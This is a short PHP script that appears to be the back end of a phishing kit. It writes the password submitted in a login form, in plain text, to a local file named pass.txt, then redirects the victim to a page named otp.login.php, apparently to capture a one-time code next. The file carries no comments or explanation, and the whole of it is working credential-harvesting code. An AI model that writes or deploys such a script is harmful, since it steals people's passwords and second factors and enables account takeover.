<?php
    file_put_contents("pass.txt", "$today: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();